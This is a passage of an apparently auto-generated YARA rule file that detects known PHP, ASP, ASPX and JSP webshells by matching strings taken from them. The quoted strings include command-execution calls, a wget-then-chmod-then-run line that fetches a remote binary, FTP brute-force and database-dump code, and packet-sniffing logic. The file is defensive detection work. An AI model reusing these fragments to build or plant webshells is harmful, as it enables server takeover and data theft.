      $s6 = "ode is on..\";}if(isset($_POST['alias'])){ foreach ($alias as $k=>$v) { if ($_POST['alias'] == $k){cmd_exec($v);}}} else {cmd_ex" ascii
      $s7 = "if (!empty($_POST['login']) && !empty($_POST['password'])){" fullword ascii
      $s8 = "if ($_POST['login'] == $login && $_POST['password'] == $password){" fullword ascii
      $s9 = "if (isset($_POST['cmd']) || isset($_POST['alias'])) {echo '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=cp866" ascii
      $s10 = "elseif(function_exists('passthru')){ob_start();passthru($cmd);$result = ob_get_contents();ob_end_clean();}" fullword ascii
      $s11 = "if (isset($_POST['cmd']) || isset($_POST['alias'])) {echo '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=cp866" ascii
      $s12 = "if(function_exists('system')){ob_start();system($cmd);$result = ob_get_contents();ob_end_clean();}" fullword ascii
      $s13 = "<td style='border-right:1px solid #333; width:200px;'><div style=' padding:50px; margin-top:50px; margin-bottom:50px; border-top" ascii
      $s14 = "<html><head><style>body{background:#333;}</style><title>login </title></head>" fullword ascii
      $s15 = "hod=\"post\" style=\"margin:0px; padding:)px;\">login: <input type=\"text\" name=\"login\" style=\"color:#999; border:1px solid " ascii
      $s16 = "if (isset ($_POST['do']) && $_POST['do']=='logout') { unset($_SESSION['logged']); }" fullword ascii
      $s17 = "else {echo ' <html><head><style>body{background:#333;}</style><title>login </title></head><body><table style=\"margin-left:100px" ascii
      $s18 = "elseif(function_exists('shell_exec')){$result = shell_exec($cmd);}" fullword ascii
      $s19 = ";}else {$dblogin = 'dblogin';}if (isset($_POST['mysqlw_passw'])){$dbpass = $_POST['mysqlw_passw'];}else {$dbpass = 'dbpassword';" ascii
      $s20 = "{$dbname  = $_POST['mysqlw_db'];} else {$dbname = 'dbname';}if (isset($_POST['mysqlw_login'])){$dblogin = $_POST['mysqlw_login']" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule aspxwebsniff1_0_linux {
   meta:
      description = "webshell - file aspxwebsniff1.0-linux.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac297be1bc6d2147d5220775da20bd422f8453abb3e288eea12f40a62e4f3343"
   strings:
      $s1 = "            logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
      $s2 = "    <a href=\" http://hi.baidu.com/cnqing/blog/item/92d8b35008ad871f377abee4.html\">1</a> " fullword ascii
      $s3 = "    <a href=\"http://hi.baidu.com/linx2008/blog/item/7020f1de1b1c805395ee3768.html\">2</a> " fullword ascii
      $s4 = "        if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
      $s5 = "                if (!logIt && my_s_http_post)" fullword ascii
      $s6 = "                if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
      $s7 = "                <asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
      $s8 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
      $s9 = "        proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
      $s10 = "            this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thr" ascii
      $s11 = "            this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+" ascii
      $s12 = "            this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thr" ascii
      $s13 = "            this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+" ascii
      $s14 = "<%@ Import Namespace=\"System.Net.Sockets\" %>" fullword ascii
      $s15 = "            FTP Password:" fullword ascii
      $s16 = "                    if (!logIt && datas.IndexOf(\"POST \")>=0)" fullword ascii
      $s17 = "        if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
      $s18 = "                if (!logIt && (dport == port || sport == port))" fullword ascii
      $s19 = "<%@ Import Namespace=\"System.Threading\" %>" fullword ascii
      $s20 = "              <asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 60KB and
      8 of them
}

rule webshell_aspx_tuo {
   meta:
      description = "webshell - file tuo.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e22d35913ca3043871b8dd3f6a1ca2239fa4000613d036fd19866f3a5de579b6"
   strings:
      $s1 = "            System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlStr, connection);" fullword ascii
      $s2 = "            file.Write(@\"<html><head><meta http-equiv=content-type content='text/html; charset=UNICODE'>" fullword ascii
      $s3 = "                    By:<a href=\"http://hi.baidu.com/" fullword ascii
      $s4 = "\" + tmpNum + \"" fullword ascii
      $s5 = "            System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cmd);" fullword ascii
      $s6 = "            System.Data.SqlClient.SqlConnection connection = new System.Data.SqlClient.SqlConnection(connectionString);" fullword ascii
      $s7 = "\" + ex.Message;" fullword ascii
      $s8 = "                        <title>Export Table</title></head><body>\");" fullword ascii
      $s9 = "            string filePath = System.IO.Path.GetDirectoryName(Server.MapPath(\"DataOutExl.aspx\"))+\"\\\\DataOut\";" fullword ascii
      $s10 = "            System.Data.DataSet ds = new System.Data.DataSet();" fullword ascii
      $s11 = "            System.Data.DataTable dataTable = ds.Tables[0];" fullword ascii
      $s12 = "            System.IO.StreamWriter file = new System.IO.StreamWriter(filePath+\"\\\\\" + (z+1) +\"_\"+fileName, false, Encoding." ascii
      $s13 = "                System.Data.DataRow dataRow = dataTable.Rows[i];" fullword ascii
      $s14 = "                    <asp:TextBox ID=\"txtPass\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
      $s15 = "                lblInfo.ForeColor = System.Drawing.Color.Red;" fullword ascii
      $s16 = "             string connectionString = \"server=\"+serverIP+\";database=\"+database+\";uid=\"+user+\";pwd=\"+pass;" fullword ascii
      $s17 = "            lblInfo.ForeColor = System.Drawing.Color.Red;" fullword ascii
      $s18 = "                    <asp:TextBox ID=\"txtUser\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
      $s19 = "<%@ Page Language=\"C#\" %>" fullword ascii
      $s20 = "\"+count+\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 30KB and
      8 of them
}

rule sniffer__aspx {
   meta:
      description = "webshell - file sniffer--aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "883986581a7f0a3dd4b2af35aa880957e9dee92019fc7e3a046328a99682ed56"
   strings:
      $s1 = "            logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
      $s2 = "        if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
      $s3 = "                if (!logIt && my_s_http_post)" fullword ascii
      $s4 = "                if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
      $s5 = "    <a href=\" http://user.qzone.qq.com/356497021\">1</a> " fullword ascii
      $s6 = "    <a href=\"http://user.qzone.qq.com/356497021\">2</a> " fullword ascii
      $s7 = "                <asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
      $s8 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
      $s9 = "        proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
      $s10 = "            this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thr" ascii
      $s11 = "            this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+" ascii
      $s12 = "            this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thr" ascii
      $s13 = "            this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+" ascii
      $s14 = "<%@ Import Namespace=\"System.Net.Sockets\" %>" fullword ascii
      $s15 = "                    if (!logIt && datas.IndexOf(\"POST \")>=0)" fullword ascii
      $s16 = "    <div id=b>Powered by <a href=\"//user.qzone.qq.com/356497021\"> " fullword ascii
      $s17 = "        if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
      $s18 = "                if (!logIt && (dport == port || sport == port))" fullword ascii
      $s19 = "<%@ Import Namespace=\"System.Threading\" %>" fullword ascii
      $s20 = "              <asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 60KB and
      8 of them
}

rule jspShell {
   meta:
      description = "webshell - file jspShell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3cf4c8e664a7c1a3d832adcb228562261bb3e0463cd68497402bb1dba51fc4e1"
   strings:
      $s1 = "<FORM NAME=\"shell\" action=\"\" method=\"POST\" onsubmit=\"exeCommand('execute');return false;\">" fullword ascii
      $s2 = "    private void execute(HttpSession session, String cmd) throws IOException {" fullword ascii
      $s3 = "        while(processThreadSession.getProgIn()==null && processThreadSession.isAlive()){" fullword ascii
      $s4 = "        session.setAttribute(\"progErrorByteArrayOutputStream\", processThreadSession.getProgError());" fullword ascii
      $s5 = "                            execute(session, cmd);" fullword ascii
      $s6 = "    private void setupProcess(HttpSession session) {" fullword ascii
      $s7 = "        session.setAttribute(\"progOutputByteArrayOutputStream\", processThreadSession.getProgOutput());" fullword ascii
      $s8 = "        Thread processThreadSessionOld = (Thread) session.getAttribute(\"process\");" fullword ascii
      $s9 = "                System.out.println(\"Process end!!!!!!!\");" fullword ascii
      $s10 = "        session.setAttribute(\"progInBufferedWriter\", processThreadSession.getProgIn());" fullword ascii
      $s11 = "                proc = runtime.exec(\"cmd\");// for Windows System use runtime.exec(\"cmd\");" fullword ascii
      $s12 = "                req.setRequestHeader('User-Agent','XMLHTTP/1.0');" fullword ascii
      $s13 = "            function exeCommand(myFunction){" fullword ascii
      $s14 = "            <input type=\"button\" value=\"Reset\" name=\"controlcButton\" onclick=\"exeCommand('controlc');return false;\"/>" fullword ascii
      $s15 = "        processThreadSession.start();" fullword ascii
      $s16 = "        ProcessThread processThreadSession = new ProcessThread();" fullword ascii
      $s17 = "    private String getOutput(HttpSession session) {" fullword ascii
      $s18 = "                        setupProcess(session);" fullword ascii
      $s19 = "        if (processThreadSessionOld != null) {" fullword ascii
      $s20 = "            processThreadSessionOld.interrupt();" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 40KB and
      8 of them
}

rule webshell_asp_aspydrv {
   meta:
      description = "webshell - file aspydrv.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d4e2230991106a793376037e910e657d810a4679ab08fbad3eb9b6089a6365c0"
   strings:
      $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
      $x2 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
      $s3 = "# password is t00ls.org" fullword ascii
      $s4 = "Uploader.Upload()" fullword ascii
      $s5 = "Response.Write \"<form method=post name=frmCopyFile action=\"\"\" & Request.Servervariables(\"SCRIPT_NAME\") & \"\"\" ><font fac" ascii
      $s6 = "response.write \"<center><FORM action=\"\"\" & Request.Servervariables(\"SCRIPT_NAME\") & \"?txtpath=\" & MyPath & \"\"\" METHOD" ascii
      $s7 = "<tr><td bgcolor=black  align=right><A HREF=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?logoff=@&...thankyou.for.using.ASpyde" ascii
      $s8 = "Response.Write \"<form method=post name=frmCopyFile action=\"\"\" & Request.Servervariables(\"SCRIPT_NAME\") & \"\"\" ><font fac" ascii
      $s9 = "<tr><td bgcolor=black  align=right><A HREF=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?logoff=@&...thankyou.for.using.ASpyde" ascii
      $s10 = "wwwRoot = left(mapPath, mapPathLen - len(myScriptName))" fullword ascii
      $s11 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
      $s12 = "<form method=\"post\" ENCTYPE=\"multipart/form-data\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?upload=@&txtpath=<%" ascii
      $s13 = "' This starts the upload process" fullword ascii
      $s14 = "Response.Write \"<font face=arial size=-2 color=red>Please create your target directory for copying files as it does not exist. " ascii
      $s15 = "<form method=\"post\" ENCTYPE=\"multipart/form-data\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?upload=@&txtpath=<%" ascii
      $s16 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
      $s17 = "server.scriptTimeout=180" fullword ascii
      $s18 = "Response.Write \"<font face=arial size=-2 color=red>Please create your target directory for copying files as it does not exist. " ascii
      $s19 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword ascii
      $s20 = "Set Uploader = New FileUploader" fullword ascii
   condition:
      uint16(0) == 0x2023 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule icesword_2 {
   meta:
      description = "webshell - file icesword.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
   strings:
      $s1 = "  _jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "public String DBExecute(String sql) {" fullword ascii
      $s3 = "  _jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s4 = "  p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s5 = " public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s6 = " <form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"jav" ascii
      $s7 = " <form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"jav" ascii
      $s8 = "  proc = runtime.exec(cmd);" fullword ascii
      $s9 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s10 = "  _jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s11 = "public String exeCmd(String cmd) {" fullword ascii
      $s12 = "  end = dataHeader.indexOf(token, start) - 1;" fullword ascii
      $s13 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s14 = "   _dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s15 = " public void setSessionTime(String sessionTime) throws JshellConfigException {" fullword ascii
      $s16 = "  retStr = \"<font color=\\\"red\\\">bad command \\\"\" + cmd + \"\\\"</font>\";" fullword ascii
      $s17 = "  p = Pattern.compile(\"private\\\\sint\\\\s_sessionOutTime\\\\s=\\\\s\" + _sessionOutTime);" fullword ascii
      $s18 = "  password = (String)request.getParameter(\"password\");" fullword ascii
      $s19 = "  password = (String)session.getAttribute(\"password\");" fullword ascii
      $s20 = "    if (_dbStatement.execute(sql)) {" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule Jspspyweb {
   meta:
      description = "webshell - file Jspspyweb.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
   strings:
      $x1 = "    pro = Runtime.getRuntime().exec(\"cmd.exe /c net start\");  " fullword ascii
      $x2 = "    pro = Runtime.getRuntime().exec(\"cmd.exe /c tasklist /svc\");  " fullword ascii
      $x3 = "    pro = Runtime.getRuntime().exec(\"cmd.exe /c netstat -an\");  " fullword ascii
      $x4 = "<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->" fullword ascii
      $x5 = "            process = Runtime.getRuntime().exec(\"ipconfig /all\");// windows" fullword ascii
      $s6 = "  String exec = exeCmd(out,\"taskkill /f /pid \"+Pid);" fullword ascii
      $s7 = "   out.print(\"<body scroll=no bgcolor=#000000><Center style=font-size:13px><div style='width:500px;border:1px solid #222;paddin" ascii
      $s8 = " out.print(\"<tr><td colspan=3><TEXTAREA style=\\\"width:100%;background-color:#FF80FF ;height=100%\\\">\"+exeCmd(out,request.ge" ascii
      $s9 = "public void pExeCmd(JspWriter out,HttpServletRequest request) throws Exception{" fullword ascii
      $s10 = "  pro = run.exec(cmd);" fullword ascii
      $s11 = "  end = dataHeader.indexOf(token, start) - 1;" fullword ascii
      $s12 = " if(session.getAttribute(\"login\")==null){" fullword ascii
      $s13 = " out.print(\"<tr><td colspan=3><TEXTAREA style=\\\"width:100%;background-color:#FF80FF ;height=100%\\\">\"+exeCmd(out,request.ge" ascii
      $s14 = ":22px;margin:100px;'><br><span style='color:#ffffff'>JspSpy V1.0 <br><br>MADE by <a href='http://blog.csdn.net/loneywall/' style" ascii
      $s15 = " out.print(\"<a href='?action=Z&command=netstart' target=FileFrame>" fullword ascii
      $s16 = " out.print(\"<a href='?action=B&command=netstat' target=FileFrame>" fullword ascii
      $s17 = "public String exeCmd(JspWriter out,String cmd) throws Exception{" fullword ascii
      $s18 = " out.print(\"<a href='?action=Y&command=tasklist' target=FileFrame>" fullword ascii
      $s19 = "</td><td>\"+System.getProperty(\"java.io.tmpdir\")+\"</td></tr>\");" fullword ascii
      $s20 = "</td><td>\"+System.getProperty(\"os.name\")+System.getProperty(\"os.version\") + \" \" + System.getProperty(\"os.arch\")+\"</td>" ascii
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule ironshell {
   meta:
      description = "webshell - file ironshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3ad8cdfdaed8ad8c18bb863023754350c3393a607f54fd7a4ca0743e88b687c2"
   strings:
      $s1 = "if(isset($_POST['pass'])) //If the user made a login attempt, \"pass\" will be set eh?" fullword ascii
      $s2 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword ascii
      $s3 = "    'cmd' => 'Execute Command'," fullword ascii
      $s4 = "function execute_command($method,$command)" fullword ascii
      $s5 = "                print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\"\\\" method=POST><b>Command:</b><input type=text" ascii
      $s6 = "        print shell_exec($command);" fullword ascii
      $s7 = "mand><input type=submit value=\\\"Execute\\\"></form>\";" fullword ascii
      $s8 = "$footer = '<tr><td><hr><center>&copy; <a href=\"http://www.ironwarez.info\">Iron</a> & <a href=\"http://www.rootshell-team.info" ascii
      $s9 = "function get_execution_method()" fullword ascii
      $s10 = "                        execute_command(get_execution_method(),$_REQUEST['command']); //You want fries with that?" fullword ascii
      $s11 = "if(isset($_GET['p']) && $_GET['p'] == \"logout\")" fullword ascii
      $s12 = "//Do not cross this line! All code placed after this block can't be executed without being logged in!" fullword ascii
      $s13 = "setcookie ($cookiename, \"\", time() - 3600);" fullword ascii
      $s14 = "        exec($command,$result);" fullword ascii
      $s15 = "                $link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . my" ascii
      $s16 = "if(!empty($password) && !isset($_COOKIE[$cookiename]) or ($_COOKIE[$cookiename] != $password))" fullword ascii
      $s17 = "otShell Security Group</a></center></td></table></body></head></html>';" fullword ascii
      $s18 = "    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {" fullword ascii
      $s19 = "r=\".get_color($file).\">\".perm($file).\"</font></a></td><td id=f>\".date (\"Y/m/d, H:i:s\", filemtime($file)).\"</td><tr>\";" fullword ascii
      $s20 = "    <form action=\".basename(__FILE__).\" method=\\\"POST\\\"><b>Password?</b>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule Sst_Sheller {
   meta:
      description = "webshell - file Sst-Sheller.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9a3ac5f1bb8152c9e24f9d66a1975bf9b8968eb719074a5bc9a0dcef3b7d6df6"
   strings:
      $x1 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x2 = "<!-- Begin ParsTools.com RSSREADER Code --><script language=\"javascript\" src=\"http://parstools.com/rss/?url=http://www.sepehr" ascii
      $x3 = "<!-- Begin ParsTools.com RSSREADER Code --><script language=\"javascript\" src=\"http://parstools.com/rss/?url=http://www.sepehr" ascii
      $x4 = "  background:url(http://yahoo21.persiangig.com/sheller/style/images/login-header.png) no-repeat 0 0 transparent; " fullword ascii
      $x5 = "<a href=\"http://www.mozilla.com/en-US/\" id=\"firefox\" target=\"_blank\"></a>" fullword ascii
      $s6 = "  background:url(http://yahoo21.persiangig.com/sheller/style/images/login-blank.png) no-repeat 0 0 transparent; " fullword ascii
      $s7 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $s8 = "<a href=http://whois.domaintools.com/\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\">\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\"</" ascii
      $s9 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/logo.png');" fullword ascii
      $s10 = "/ This Sheller Design And Coded By: Mr.Amir-Masoud" fullword ascii
      $s11 = "This Shell Coded By: Mr.Amir-Masoud !<br />" fullword ascii
      $s12 = "<iframe src=\"http://elhamit77.persiangig.com/sheller/message.html\" width=\"260px\" frameborder=\"0\"></iframe>" fullword ascii
      $s13 = "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-latest.pack.js\"></script>" fullword ascii
      $s14 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/news.png');" fullword ascii
      $s15 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/mbg.png');" fullword ascii
      $s16 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/msg.png');" fullword ascii
      $s17 = "$source = 'http://yahoo21.persiangig.com/sheller/cgi.pl';" fullword ascii
      $s18 = "  background:url(http://yahoo21.persiangig.com/sheller/style/images/notice.png) no-repeat 0 0 transparent; " fullword ascii
      $s19 = "background-image:url('http://yahoo21.persiangig.com/sheller/style/images/rss.png');" fullword ascii
      $s20 = "$source = 'http://yahoo21.persiangig.com/sheller/ddos.txt';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule c99_PSych0 {
   meta:
      description = "webshell - file c99_PSych0.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x3 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x5 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s6 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");} " fullword ascii
      $s7 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii
      $s8 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - phpshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAM" ascii
      $s9 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s10 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii
      $s11 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $s12 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s13 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $s14 = "m/scripts/contact.dll?msgto=656555\\\"><img src=\\\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\\\" border=0 align=ab" ascii
      $s15 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s16 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) " fullword ascii
      $s17 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s18 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s19 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s20 = " $out = \"# Dumped by C99Shell.SQL v. \".$shver.\" " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule c99_locus7s {
   meta:
      description = "webshell - file c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "s7s.com/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");} " fullword ascii
      $x3 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x4 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x5 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x6 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x7 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgcol" ascii
      $x8 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s9 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii
      $s10 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $s11 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - Locus7Shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-" ascii
      $s12 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s13 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii
      $s14 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $s15 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s16 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
